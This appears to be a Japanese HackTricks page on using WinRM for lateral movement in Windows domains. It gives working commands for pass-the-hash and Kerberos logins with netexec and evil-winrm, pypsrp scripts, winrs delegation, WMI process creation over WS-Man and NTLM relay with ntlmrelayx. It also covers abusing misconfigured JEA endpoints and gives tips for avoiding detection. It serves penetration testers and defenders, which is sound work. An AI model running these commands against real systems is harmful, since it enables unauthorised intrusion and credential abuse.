# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRMは、SMBのサービス作成を利用した手法を使わずに**WS-Man/HTTP(S)**経由でリモートシェルを利用できるため、Windows環境で最も便利な**lateral movement**用トランスポートの1つです。ターゲットが**5985/5986**を公開しており、プリンシパルにリモート接続の権限があれば、「有効な認証情報」から「対話型シェル」へすばやく移行できることがよくあります。

**プロトコル/サービスの列挙**、リスナー、WinRMの有効化、`Invoke-Command`、汎用的なクライアントの使用方法については、以下を参照してください。

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## オペレーターがWinRMを好む理由

- SMB/RPCの代わりに**HTTP/HTTPS**を使うため、PsExec形式の実行がブロックされる環境でも動作することがよくあります。
- **Kerberos**を使うと、再利用可能な認証情報をターゲットに送信せずに済みます。
- **Windows**、**Linux**、**Python**のツール（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）からスムーズに利用できます。
- 対話型のPowerShell remotingでは、認証されたユーザーのコンテキストでターゲット上に**`wsmprovhost.exe`**が起動します。これは、サービスベースのexecとは動作上異なります。

## アクセスモデルと前提条件

実際には、WinRMによるlateral movementが成功するかどうかは、次の**3つ**に左右されます。

1. ターゲットに**WinRMリスナー**（`5985`/`5986`）があり、ファイアウォールルールでアクセスが許可されている。
2. アカウントがエンドポイントに対して**認証**できる。
3. アカウントに**リモート接続セッションを開く権限**がある。

アクセス権を得る一般的な方法は次のとおりです。

- ターゲットの**Local Administrator**。
- 新しいシステムでは**Remote Management Users**、またはこのグループが引き続き有効なシステム/コンポーネントでは**WinRMRemoteWMIUsers__**のメンバーであること。
- ローカルセキュリティ記述子やPowerShell remoting ACLの変更を通じて明示的に委任されたリモート接続権限。

管理者権限で制御できるホストがすでにある場合は、ここで説明されている手法を使って、管理者グループへの完全な所属なしにWinRMアクセスを**委任**することもできます。

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### lateral movement中に重要な認証上の注意点

- **Kerberosにはホスト名/FQDNが必要**です。IPで接続すると、通常、クライアントは**NTLM/Negotiate**にフォールバックします。
- **ワークグループ**や信頼関係をまたぐ一部のケースでは、NTLMを使うために**HTTPS**にするか、クライアント側でターゲットを**TrustedHosts**に追加する必要があります。
- ワークグループでNegotiate経由の**ローカルアカウント**を使う場合、組み込みのAdministratorアカウントを使うか、`LocalAccountTokenFilterPolicy=1`を設定しないと、UACのリモート制限によってアクセスできないことがあります。
- PowerShell remotingでは、デフォルトで**`HTTP/<host>` SPN**を使います。環境内ですでに**`HTTP/<host>`**が別のサービスアカウントに登録されている場合、WinRM Kerberosは`0x80090322`で失敗することがあります。その場合はポート付きのSPNを使うか、存在する場合は**`WSMAN/<host>`**に切り替えてください。<sup>[[3]](#references)</sup>

パスワードスプレー中に有効な認証情報を入手した場合、WinRM経由で検証するのが、それらの認証情報でシェルを取得できるか確認する最速の方法であることがよくあります。

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## LinuxからWindowsへのlateral movement

### 検証と単発実行に使うNetExec / CrackMapExec

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### インタラクティブシェル向けの Evil-WinRM

Linux から利用できる最も便利なインタラクティブオプションは、引き続き `evil-winrm` です。**パスワード**、**NT ハッシュ**、**Kerberos チケット**、**クライアント証明書**、ファイル転送、メモリ上での PowerShell/.NET の読み込みに対応しています。

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN の例外ケース: `HTTP` と `WSMAN`

デフォルトの **`HTTP/<host>`** SPN が原因で Kerberos 認証に失敗する場合は、代わりに **`WSMAN/<host>`** チケットを要求または使用してみてください。これは、強化された環境や特殊なエンタープライズ環境で、`HTTP/<host>` がすでに別のサービスアカウントに関連付けられている場合に見られます。<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

これは、汎用の `HTTP` チケットではなく、**WSMAN** サービスチケットを特に偽造または要求した場合の **RBCD / S4U** abuse の後にも役立ちます。

### 証明書ベースの認証

WinRM は**クライアント証明書認証**にも対応していますが、証明書はターゲット上の**ローカルアカウント**にマッピングされている必要があります。攻撃者の視点では、次のような場合に重要です。

- WinRM 用にすでにマッピングされた有効なクライアント証明書と秘密鍵を盗み出した、またはエクスポートした場合。
- **AD CS / Pass-the-Certificate** を悪用してプリンシパルの証明書を取得し、別の認証経路へピボットする場合。
- パスワードベースのリモート接続を意図的に避ける環境で活動している場合。

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM は password/hash/Kerberos auth と比べるとかなり一般的ではありませんが、利用できる場合は、パスワードローテーション後も有効な**パスワード不要の lateral movement**経路となる可能性があります。

### Python / `pypsrp` による自動化

オペレーター用のシェルではなく自動化が必要な場合、`pypsrp` を使うと、Python から **NTLM**、**certificate auth**、**Kerberos**、**CredSSP** に対応した WinRM/PSRP を利用できます。<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


高レベルの `Client` wrapper より細かく制御する必要がある場合、低レベルの `WSMan` + `RunspacePool` API は、次の2つの一般的な operator の課題に役立ちます。

- 多くの PowerShell client がデフォルトで想定する `HTTP` ではなく、Kerberos service/SPN として **`WSMAN`** を強制する。
- **`Microsoft.PowerShell`** ではなく、**JEA** / カスタム session configuration など、デフォルト以外の PSRP endpoint に接続する。

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### ラテラルムーブメントではカスタム PSRP エンドポイントと JEA が重要

WinRM 認証に成功しても、必ずしもデフォルトの制限のない `Microsoft.PowerShell` エンドポイントに接続できるとは限りません。成熟した環境では、独自の ACL や実行ユーザーの動作を持つ**カスタムセッション構成**や **JEA** エンドポイントが公開されていることがあります。<sup>[[1]](#references)</sup>

すでに Windows ホスト上でコード実行が可能で、どのリモート接続面が存在するかを把握したい場合は、登録済みのエンドポイントを列挙します:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

有用なエンドポイントが存在する場合は、デフォルトのシェルではなく、それを明示的にターゲットにします。

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

実践的な攻撃上の影響:

- **restricted** endpointでも、サービス制御、ファイルアクセス、プロセス作成、任意の .NET / 外部コマンド実行に必要なcmdlet/functionだけが公開されていれば、lateral movementに十分な場合があります。
- **misconfigured JEA** roleは、`Start-Process`、広範なワイルドカード、書き込み可能なprovider、または意図された制限からの脱出を可能にするカスタムproxy functionなど、危険なコマンドを公開している場合、特に価値があります。
- **RunAs virtual account**または**gMSA**を使うendpointでは、実行するコマンドの有効なセキュリティコンテキストが変わります。特に、gMSAを使うendpointは、通常のWinRM sessionでは従来のdelegation問題が発生する場合でも、**second hopでネットワークIDを使用できます**。

カスタムのrestricted endpointでは、有効なコマンド権限とスクリプト権限を個別に確認してください。`Get-Command`の一覧が短いだけでは、既存の`.ps1`を実行できない証明にはなりません。[JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities)では、呼び出し可能なスクリプトパスが明示的に制御されます。他のカスタムendpointでは、異なるsessionルールが適用される場合があります。許可されたスクリプトが保存済みの`SecureString`を使って別のホスト向けのcredentialを作成する場合、明示的なkeyを指定せずに作成されたblobは[Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)を使用し、通常、復号には保護に使われたユーザーとマシンのコンテキストが必要です。書き込み可能なソースやコピーしたblobを別ホストへの昇格経路とみなす前に、スクリプトのACL、許可された呼び出し方法、run-as identity、後続のcredential権限を確認してください。受動的な列挙中に保護された値を出力しないでください。

ファイルパスを受け取るJEAカスタムfunctionでは、登録済みendpointのACL、割り当てられたrole capability、有効なrun-as identityを合わせて確認してください。呼び出し元の`NoLanguage`設定にかかわらずfunction本体がシステムの既定のlanguage modeで実行される場合があり、virtual accountにローカル管理者権限が付与されていることもあります。functionが許可されたディレクトリを文字列のprefixでのみ確認し、その後に指定されたパスを読み取る場合、`..`要素によってそのディレクトリ外を参照できる可能性があります。境界を決めるのは、呼び出し元のlanguage modeや見かけ上のprefixではなく、functionのidentityで解決されたパスです。読み取り可能な`.psrc`や`.pssc`ファイルを特権ファイル読み取りのfindingとみなす前に、到達可能なfunctionと最終パスの検証を確認してください。Microsoftの[JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities)および[security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations)のガイダンスを参照してください。

## Windows標準機能を使ったWinRM lateral movement

### `winrs.exe`

`winrs.exe`は組み込みツールで、対話型のPowerShell remoting sessionを開かずに**標準のWinRMコマンド実行**を行いたい場合に便利です:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

忘れやすく、実際の運用で重要なフラグが2つあります。

- リモートのユーザーがローカル管理者でない場合、`/noprofile` が必要になることがよくあります。
- `/allowdelegate` を指定すると、リモートシェルから自分の認証情報を使って **3台目のホスト** にアクセスできます（たとえば、コマンドで `\\fileserver\share` が必要な場合）。

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

実際の運用では、`winrs.exe` によって、一般に次のようなリモートプロセスチェーンが発生します:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

これは、service-based execやinteractive PSRP sessionsとは異なるため、覚えておく価値があります。

### `winrm.cmd` / PowerShell remotingの代わりにWS-Man COM

`Enter-PSSession`を使わずに、WS-Man経由でWMIクラスを呼び出して**WinRM transport**経由で実行することもできます。これにより、transportはWinRMのまま、リモート実行のプリミティブは**WMI `Win32_Process.Create`**になります：

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

この方法は、次のような場合に役立ちます。

- PowerShell logging が厳重に監視されている。
- **WinRM transport** は使いたいが、従来の PS remoting workflow は使いたくない。
- **`WSMan.Automation`** COM object を利用する独自ツールを開発または使用している。

## NTLM relay to WinRM (WS-Man)

SMB relay が signing によってブロックされ、LDAP relay に制約がある場合でも、**WS-Man/WinRM** は魅力的な relay target となる可能性があります。最新の `ntlmrelayx.py` には **WinRM relay servers** が含まれており、**`wsman://`** または **`winrms://`** target に relay できます。

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

実用上の注意点が2つあります。

- Relayは、ターゲットが**NTLM**を受け入れ、リレーされたプリンシパルにWinRMの使用が許可されている場合に最も有効です。
- 最近のImpacketコードは、**`WSMANIDENTIFY: unauthenticated`**リクエストを明示的に処理するため、`Test-WSMan`形式のプローブによってRelayのフローが妨げられることはありません。

最初のWinRMセッション確立後のマルチホップ制約については、次を確認してください。

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSECと検知に関する注意点

- **対話型PowerShellリモーティング**では通常、ターゲット上に**`wsmprovhost.exe`**が作成されます。
- **`winrs.exe`**では一般的に**`winrshost.exe`**が作成され、その後、要求された子プロセスが作成されます。
- カスタム**JEA**エンドポイントでは、アクションが**`WinRM_VA_*`**仮想アカウントまたは構成済みの**gMSA**として実行される場合があり、通常のユーザーコンテキストのシェルと比べて、テレメトリと2ホップ目の動作がどちらも変わります。<sup>[[1]](#references)</sup>
- raw `cmd.exe`ではなくPSRPを使う場合は、ネットワークログオンのテレメトリ、WinRMサービスのイベント、PowerShellのOperationalログやスクリプトブロックログが記録されることを想定してください。
- 単一のコマンドだけが必要なら、`winrs.exe`または1回限りのWinRM実行のほうが、長時間の対話型リモーティングセッションより目立ちにくい場合があります。
- Kerberosを利用できる場合は、IP + NTLMよりも**FQDN + Kerberos**を優先してください。信頼関係に関する問題と、クライアント側の`TrustedHosts`を変更する煩雑さの両方を減らせます。

## References

- [1] [Microsoft: JEA セキュリティに関する考慮事項](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: WinRM経由でPowerShellをリモートサーバーに接続する際のエラー`0x80090322`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
